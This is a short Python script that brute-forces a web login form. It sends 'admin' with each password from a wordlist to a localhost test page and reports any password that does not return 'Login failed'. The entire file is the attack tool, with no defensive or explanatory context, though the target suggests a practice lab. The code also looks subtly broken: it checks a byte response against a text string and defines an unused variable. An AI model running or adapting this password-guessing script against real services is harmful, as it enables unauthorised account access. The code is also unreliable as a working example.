import requests

target = 'http://localhost/test/login.php'

data_d = {
    "username": "admin",
    "password": "",
    "Login": "submit"
}

pass_List = "/home/pass.txt"
error = ['failed']

with open(pass_List, 'r') as wordlist:
    for i in wordlist:
        w = i.strip()
        data_d['password'] = w
        response = requests.post(
            target,
            data=data_d
        )
        if "Login failed" not in response.content:
            print("+ Got Pass -> {}".format(w))